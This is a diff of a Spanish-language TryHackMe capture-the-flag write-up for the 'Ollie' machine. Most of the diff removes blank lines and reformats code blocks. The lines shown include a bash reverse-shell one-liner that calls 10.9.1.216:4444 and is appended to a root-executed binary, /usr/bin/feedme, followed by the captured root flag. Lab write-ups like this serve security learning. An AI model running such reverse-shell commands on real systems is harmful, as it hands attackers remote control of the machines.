@@ -404,41 +404,15 @@ Draining file system events due to startup...
 ollie@hackerdog:/usr/bin$ echo "/bin/bash -i >& /dev/tcp/10.9.1.216/4444 0>&1" >> /usr/bin/feedme
 ~~~
 
-
-
-
-
+~~~go
 echo "/bin/bash -i >& /dev/tcp/10.9.1.216/4444 0>&1" >> /usr/bin/feedme
-
-
+~~~
 
 cat root.txt
 THM{Ollie_Luvs_Chicken_Fries}
 root@hackerdog:~# 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  ---
+---
 
   Eso es todo!
 
@@ -452,8 +426,3 @@ root@hackerdog:~#
 
   Cyberchef: herramienta en linea para descifrar.
   <https://gchq.github.io/CyberChef/>
-
-  Writeup:
-  <https://0xnirvana.gitbook.io/writeups/tryhackme/easy/break-out-of-the-cage>
-
-![R install](https://raw.githubusercontent.com/Rgrupoec/Rgrupoec.github.io/master/img/publicaciones/2017-07-23-install_r.gif)
